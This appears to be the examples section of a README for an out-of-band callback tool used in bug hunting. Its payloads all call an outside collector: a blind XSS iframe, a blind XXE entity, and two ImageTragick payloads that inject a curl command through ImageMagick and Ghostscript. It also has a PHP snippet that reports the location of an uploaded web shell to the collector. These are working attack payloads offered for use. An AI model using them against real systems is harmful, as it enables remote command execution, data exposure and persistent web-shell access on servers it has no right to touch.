###### EXAMPLES :
> Blind XSS :
* <iframe src="http://example/Hunter.php?url=victim.com"></iframe>

> Blind XXE :
* <!ENTITY name SYSTEM "http://example/Hunter.php?url=victim.com">

> ImageTragick :
1* push graphic-context
   viewbox 0 0 640 480
   image over 0,0 0,0 'http://dead.epizy.com/1.php?x=%60curl http://dead.epizy.com/1.php'
   pop graphic-context

2* %!PS
   userdict /setpagedevice undef
   legal
   { null restore } stopped { pop } if
   legal
   mark /OutputFile (%pipe%curl -XGET http://dead.epizy.com/1.php') currentdevice putdeviceprops

> While uploading a Shell and didn't get it's path :
 
<?php  
// this script make request to hunter contains the unknown path of the uploaded shell
// the request will be sent once the file opened 
$url = "http://example/hunter.php?location=".getcwd();
$do = file_get_contents($url);
if($do) {
  print "location sent";
}

?>